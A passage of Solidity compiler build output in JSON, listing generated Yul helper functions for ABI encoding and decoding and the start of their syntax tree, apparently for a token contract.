ry_ptr_fromStack":{"entryPoint":7198,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a_to_t_string_memory_ptr_fromStack":{"entryPoint":7233,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":7268,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":7283,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed":{"entryPoint":7310,"id":null,"parameterSlots":5,"returnSlots":1},"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed":{"entryPoint":7386,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7413,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7447,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7479,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7511,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7543,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7575,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7607,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7639,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7671,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7703,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7735,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7767,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7799,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":7831,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_memory":{"entryPoint":7858,"id":null,"parameterSlots":1,"returnSlots":1},"allocate_unbounded":{"entryPoint":7885,"id":null,"parameterSlots":0,"returnSlots":1},"array_allocation_size_t_bytes_memory_ptr":{"entryPoint":7895,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_bytes_memory_ptr":{"entryPoint":7944,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":7955,"id":null,"parameterSlots":1,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack":{"entryPoint":7966,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":7983,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":8000,"id":null,"parameterSlots":2,"returnSlots":1},"checked_sub_t_uint256":{"entryPoint":8086,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":8138,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bool":{"entryPoint":8156,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bytes4":{"entryPoint":8168,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":8212,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":8244,"id":null,"parameterSlots":1,"returnSlots":1},"copy_calldata_to_memory":{"entryPoint":8254,"id":null,"parameterSlots":3,"returnSlots":0},"copy_memory_to_memory":{"entryPoint":8269,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":8320,"id":null,"parameterSlots":1,"returnSlots":1},"finalize_allocation":{"entryPoint":8370,"id":null,"parameterSlots":2,"returnSlots":0},"panic_error_0x11":{"entryPoint":8419,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x22":{"entryPoint":8466,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":8513,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d":{"entryPoint":8560,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae":{"entryPoint":8565,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":8570,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":8575,"id":null,"parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":8580,"id":null,"parameterSlots":1,"returnSlots":1},"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af":{"entryPoint":8597,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e":{"entryPoint":8676,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48":{"entryPoint":8755,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57":{"entryPoint":8834,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4":{"entryPoint":8875,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05":{"entryPoint":8954,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159":{"entryPoint":8995,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6":{"entryPoint":9074,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f":{"entryPoint":9115,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942":{"entryPoint":9156,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83":{"entryPoint":9235,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a":{"entryPoint":9314,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_address":{"entryPoint":9393,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bool":{"entryPoint":9416,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bytes4":{"entryPoint":9439,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":9462,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:25701:15","statements":[{"body":{"nodeType":"YulBlock","src":"90:327:15","statements":[{"nodeType":"YulAssignment","src":"100:74:15","value":{"arguments":[{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"166:6:15"}],"functionName":{"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"125:40:15"},"nodeType":"YulFunctionCall","src":"125:48:15"}],"functionName":{"name":"allocate_memory","nodeType":"YulIdentifier","src":"109:15:15"},"nodeType":"YulFunctionCall","src":"109:65:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"100:5:15"}]},{"expression":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"190:5:15"},{"name":"length","nodeType":"YulIdentifier","src":"197:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"183:6:15"},"nodeType":"YulFunctionCall","src":"183:21:15"},"nodeType":"YulExpressionStatement","src":"183:21:15"},{"nodeType":"YulVariableDeclaration","src":"213:27:15","value":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"228:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"235:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"224:3:15"},"nodeType":"YulFunctionCall","src":"224:16:15"},"variables":[{"name":"dst","nodeType":"YulTypedName","src":"217:3:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"278:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulIdentifier","src":"280:77:15"},"nodeType":"YulFunctionCall","src":"280:79:15"},"nodeType":"YulExpressionStatement","src":"280:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"259:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"264:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"255:3:15"},"nodeType":"YulFunctionCall","src":"255:16:15"},{"name":"end","nodeType":"YulIdentifier","src":"273:3:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"252:2:15"},"nodeType":"YulFunctionCall","src":"252:25:15"},"nodeType":"YulIf","src":"249:112:15"},{"expression":{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"394:3:15"},{"name":"dst","nodeType":"YulIdentifier","src":"399:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"404:6:15"}],"functionName":{"name":"copy_calldata_to_memory","nodeType":"YulIdentifier","src":"370:23:15"},"nodeType":"YulFunctionCall","src":"370:41:15"},"nodeType":"YulExpressionStatement","src":"370:41:15"}]},"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"63:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"68:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"76:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"84:5:15","type":""}],"src":"7:410:15"},{"body":{"nodeType":"YulBlock","src":"475:87:15","statements":[{"nodeType":"YulAssignment","src":"485:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"507:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"494:12:15"},"nodeType":"YulFunctionCall","src":"494:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"485:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"550:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"523:26:15"},"nodeType":"YulFunctionCall","src":"523:33:15"},"nodeType":"YulExpressionStatement","src":"523:33:15"}]},"name":"abi_decode_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"453:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"461:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"469:5:15","type":""}],"src":"423:139:15"},{"body":{"nodeType":"YulBlock","src":"617:84:15","statements":[{"nodeType":"YulAssignment","src":"627:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"649:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"636:12:15"},"nodeType":"YulFunctionCall","src":"636:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"627:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"689:5:15"}],"functionName":{"name":"validator_revert_t_bool","nodeType":"YulIdentifier","src":"665:23:15"},"nodeType":"YulFunctionCall","src":"665:30:15"},"nodeType":"YulExpressionStatement","src":"665:30:15"}]},"name":"abi_decode_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"595:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"603:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"611:5:15","type":""}],"src":"568:133:15"},{"body":{"nodeType":"YulBlock","src":"758:86:15","statements":[{"nodeType":"YulAssignment","src":"768:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"790:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"777:12:15"},"nodeType":"YulFunctionCall","src":"777:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"768:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"832:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"806:25:15"},"nodeType":"YulFunctionCall","src":"806:32:15"},"nodeType":"YulExpressionStatement","src":"806:32:15"}]},"name":"abi_decode_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"736:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"744:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"752:5:15","type":""}],"src":"707:137:15"},{"body":{"nodeType":"YulBlock","src":"912:79:15","statements":[{"nodeType":"YulAssignment","src":"922:22:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"937:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"931:5:15"},"nodeType":"YulFunctionCall","src":"931:13:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"922:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"979:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"953:25:15"},"nodeType":"YulFunctionCall","src":"953:32:15"},"nodeType":"YulExpressionStatement","src":"953:32:15"}]},"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"890:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"898:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"906:5:15","type":""}],"src":"850:141:15"},{"body":{"nodeType":"YulBlock","src":"1071:277:15","statements":[{"body":{"nodeType":"YulBlock","src":"1120:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulIdentifier","src":"1122:77:15"},"nodeType":"YulFunctionCall","src":"1122:79:15"},"nodeType":"YulExpressionStatement","src":"1122:79:15"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1099:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1107:4:15","type":"","value":"0x1f"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1095:3:15"},"nodeType":"YulFunctionCall","src":"1095:17:15"},{"name":"end","nodeType":"YulIdentifier","src":"1114:3:15"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1091:3:15"},"nodeType":"YulFunctionCall","src":"1091:27:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"1084:6:15"},"nodeType":"YulFunctionCall","src":"1084:35:15"},"nodeType":"YulIf","src":"1081:122:15"},{"nodeType":"YulVariableDeclaration","src":"1212:34:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1239:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1226:12:15"},"nodeType":"YulFunctionCall","src":"1226:20:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"1216:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1255:87:15","value":{"arguments":[{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1315:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"1323:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1311:3:15"},"nodeType":"YulFunctionCall","src":"1311:17:15"},{"name":"length","nodeType":"YulIdentifier","src":"1330:6:15"},{"name":"end","nodeType":"YulIdentifier","src":"1338:3:15"}],"functionName":{"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"1264:46:15"},"nodeType":"YulFunctionCall","src":"1264:78:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"1255:5:15"}]}]},"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1049:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1057:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"1065:5:15","type":""}],"src":"1010:338:15"},{"body":{"nodeType":"YulBlock","src":"1406:87:15","statements":[{"nodeType":"YulAssignment","src":"1416:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"1438:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"1425:12:15"},"nodeType":"YulFunctionCall","src":"1425:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"1416:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1481:5:15"}],"functionName":{"name":"validator_revert_t_uint256","nodeType":"YulIdentifier","src":"1454:26:15"},"nodeType":"YulFunctionCall","src":"1454:33:15"},"nodeType":"YulExpressionStatement","src":"1454:33:15"}]},"name":"abi_decode_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"1384:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"1392:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"1400:5:15","type":""}],"src":"1354:139:15"},{"body":{"nodeType":"YulBlock","src":"1565:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"1611:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1613:77:15"},"nodeType":"YulFunctionCall","src":"1613:79:15"},"nodeType":"YulExpressionStatement","src":"1613:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1586:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1595:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1582:3:15"},"nodeType":"YulFunctionCall","src":"1582:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1607:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1578:3:15"},"nodeType":"YulFunctionCall","src":"1578:32:15"},"nodeType":"YulIf","src":"1575:119:15"},{"nodeType":"YulBlock","src":"1704:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1719:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1733:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1723:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1748:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1783:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1794:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1779:3:15"},"nodeType":"YulFunctionCall","src":"1779:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1803:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"1758:20:15"},"nodeType":"YulFunctionCall","src":"1758:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1748:6:15"}]}]}]},"name":"abi_decode_tuple_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1535:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1546:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1558:6:15","type":""}],"src":"1499:329:15"},{"body":{"nodeType":"YulBlock","src":"1917:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"1963:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1965:77:15"},"nodeType":"YulFunctionCall","src":"1965:79:15"},"nodeType":"YulExpressionStatement","src":"1965:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1938:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1947:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1934:3:15"},"nodeType":"YulFunctionCall","src":"1934:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1959:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1930:3:15"},"nodeType":"YulFunctionCall","src":"1930:32:15"},"nodeType":"YulIf","src":"1927:119:15"},{"nodeType":"YulBlock","src":"2056:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2071:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2085:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2075:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2100:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2135:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2146:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2131:3:15"},"nodeType":"YulFunctionCall","src":"2131:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2155:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2110:20:15"},"nodeType":"YulFunctionCall","src":"2110:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2100:6:15"}]}]},{"nodeType":"YulBlock","src":"2183:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2198:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2212:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2202:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2228:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2263:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2274:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2259:3:15"},"nodeType":"YulFunctionCall","src":"2259:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2283:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2238:20:15"},"nodeType":"YulFunctionCall","src":"2238:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2228:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1879:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1890:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1902:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"1910:6:15","type":""}],"src":"1834:474:15"},{"body":{"nodeType":"YulBlock","src":"2414:519:15","statements":[{"body":{"nodeType":"YulBlock","src":"2460:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"2462:77:15"},"nodeType":"YulFunctionCall","src":"2462:79:15"},"nodeType":"YulExpressionStatement","src":"2462:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"2435:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"2444:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2431:3:15"},"nodeType":"YulFunctionCall","src":"2431:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"2456:2:15","type":"","value":"96"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"2427:3:15"},"nodeType":"YulFunctionCall","src":"2427:32:15"},"nodeType":"YulIf","src":"2424:119:15"},{"nodeType":"YulBlock","src":"2553:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2568:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2582:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2572:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2597:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2632:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2643:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2628:3:15"},"nodeType":"YulFunctionCall","src":"2628:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2652:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2607:20:15"},"nodeType":"YulFunctionCall","src":"2607:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"2597:6:15"}]}]},{"nodeType":"YulBlock","src":"2680:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2695:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2709:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2699:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2725:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2760:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2771:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2756:3:15"},"nodeType":"YulFunctionCall","src":"2756:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2780:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"2735:20:15"},"nodeType":"YulFunctionCall","src":"2735:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2725:6:15"}]}]},{"nodeType":"YulBlock","src":"2808:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2823:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2837:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2827:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2853:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2888:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2899:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2884:3:15"},"nodeType":"YulFunctionCall","src":"2884:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2908:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"2863:20:15"},"nodeType":"YulFunctionCall","src":"2863:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"2853:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"2368:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"2379:7: